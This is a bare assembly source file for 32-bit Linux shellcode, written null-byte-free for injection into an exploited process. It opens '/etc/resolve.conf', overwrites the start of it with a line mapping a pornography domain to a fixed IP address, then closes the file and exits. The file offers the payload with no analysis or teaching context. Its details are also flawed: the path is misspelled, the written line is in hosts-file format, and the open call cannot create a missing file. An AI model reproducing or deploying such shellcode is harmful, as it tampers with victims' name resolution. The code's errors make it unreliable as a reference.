BITS 32
xor eax,eax
xor ecx,ecx
xor ebx,ebx
cdq
    
mov al,5
jmp short filename
poppaebx:
   pop ebx
   mov cl,2
   int 0x80
   
   mov esi,eax
   
   mov ebx,eax
   mov al,4
   jmp short text
poppaecx:
   pop ecx
   mov dl,31
   int 0x80
   
   mov al,6
   mov ebx,esi
   int 0x80

   mov al,1
   mov bl,0
   int 0x80
filename:
        call poppaebx
        db '/etc/resolve.conf',0
text:
    call poppaecx
    db '173.194.35.16 www.youporn.com',0x0a,0x0d